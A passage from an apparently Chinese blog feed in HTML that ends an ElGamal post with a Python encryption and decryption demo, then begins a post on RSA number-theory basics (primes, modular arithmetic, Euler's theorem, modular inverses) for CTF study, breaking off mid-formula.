class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>给A</li></ul><h2 id="解密">解密</h2><p>A拿到B发送过来的密文之后</p><ul><li>计算B使用的密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><msubsup><mi>c</mi><mn>1</mn><mi>x</mi></msubsup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">k=c_1^x\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9125em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>是在循环群内选取的，所可以计算出逆元<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">k^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></li><li>计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mo>∗</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m=c_2*k^{-1}\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6153em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li></ul><p>python实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">e_gcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> a, <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    g, x, y = e_gcd(b, a%b)<br>    <span class="hljs-keyword">return</span> g, y, x-a//b*y  <span class="hljs-comment">#1.gcd 2.a^-1 mod b 3.b^-1 mod a</span><br><br><span class="hljs-comment">#求最小原根</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_generator</span>(<span class="hljs-params">n</span>):<br>    k=(n-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,n-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> multimod(i,k,n)!=<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> i<br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">multimod</span>(<span class="hljs-params">a,k,n</span>):    <span class="hljs-comment">#快速幂取模</span><br>    ans=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(k!=<span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">if</span> k&amp;<span class="hljs-number">1</span>:<br>            ans = (ans * a) % n<br>        a=(a*a)%n<br>        k=k&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> ans<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">m, p, y,g</span>):<br>    k = random.randint(<span class="hljs-number">1</span>, p - <span class="hljs-number">1</span>)<br>    C1=multimod(g,k,p)<span class="hljs-comment"># c1=g^k%p</span><br>    <span class="hljs-comment">#计算m*y^k %p</span><br>    C2=(m*multimod(y,k,p)) % p<br>    <span class="hljs-keyword">return</span> C1,C2,k<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">C1, C2, x,p</span>):<br>    s = multimod(C1,x,p)<br>    s_ = e_gcd(s, p)[<span class="hljs-number">1</span>]<br>    m = C2*s_ % p<br>    <span class="hljs-keyword">return</span> m<br><span class="hljs-comment"># Driver code</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    m = <span class="hljs-string">&#x27;1234567&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;明文 :&quot;</span>, m)<br><br>    p = getPrime(<span class="hljs-number">512</span>)<br>    x = random.randint(<span class="hljs-number">1</span>, p-<span class="hljs-number">1</span>)<span class="hljs-comment">#私钥</span><br><br>    g = get_generator(p)<br>    y = multimod(g, x, p)<span class="hljs-comment">#公钥</span><br><br><br>    C1, C2, k = encrypt(<span class="hljs-built_in">int</span>(m), p, y, g)<br>    m_ = decrypt(C1, C2, x, p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密后明文 :&quot;</span>, m_)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>+<span class="hljs-built_in">str</span>(p))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;g=&#x27;</span>+<span class="hljs-built_in">str</span>(g))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x=&#x27;</span>+<span class="hljs-built_in">str</span>(x))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;k=&#x27;</span>+<span class="hljs-built_in">str</span>(k))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;密文：C1=&#x27;</span>+<span class="hljs-built_in">str</span>(C1))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;C2=&#x27;</span>+<span class="hljs-built_in">str</span>(C2))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>有关rsa</title>
    <link href="/2023/05/14/%E6%9C%89%E5%85%B3rsa/"/>
    <url>/2023/05/14/%E6%9C%89%E5%85%B3rsa/</url>
    
    <content type="html"><![CDATA[<h1 id="Rsa基础知识">Rsa基础知识</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">rsa是经常出现在ctf考题中的一类题，它是基于大素因数分解难题产生的公钥密码<br></code></pre></td></tr></table></figure><h2 id="数学基础">数学基础</h2><h3 id="素数">素数</h3><p>素数又叫质数，除了1和其本身，不能被其他数整除的数叫做素数</p><h3 id="模运算">模运算</h3><p>模运算是取余运算，其符号为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">mod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span></span></span></span></p><h3 id="同余">同余</h3><p>两个数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> 对同一个数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>取余结果相同，则称<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>模<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>同余</p><h3 id="互质">互质</h3><p>当两个正整数除了1之外没有其他公因子，我们就称这两个数互质</p><p>任意两个质数一定互质</p><h3 id="欧拉函数">欧拉函数</h3><p>数论中，对正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，欧拉函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>指的是小于或等于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>的正整数中与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>互质的数</p><p>易知质数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>的欧拉函数是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p>若不是质数，其欧拉函数有公式：</p><h3 id="欧拉定理">欧拉定理</h3><p>若两个正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">a,\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>互质，则如下等式成立</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">a^{\varphi(n)}\equiv1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><h3 id="费马小定理">费马小定理</h3><p>是欧拉定理的特例，当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>是质数并且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>互质</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{p-1}\equiv1\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></span></p><h3 id="模逆元">模逆元</h3><p>对整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span></span></span></span>，若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">ab\equiv1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">ab</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span> 则称 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> 关于模 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 互为模倒数，也称为模反元素或模逆元，还可以记作</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>b</mi><mo>=</mo><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">b=a^{-1}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><h2 id="Rsa原理">Rsa原理</h2><ul><li>准备两个非常大的素数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li><li>计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n=p*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li><li>计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">p,\ q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>都是素数，所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>φ</mi><mo stretchy="false">(</mo><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(\ n)=\varphi(\ p)*\varphi(\ q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span 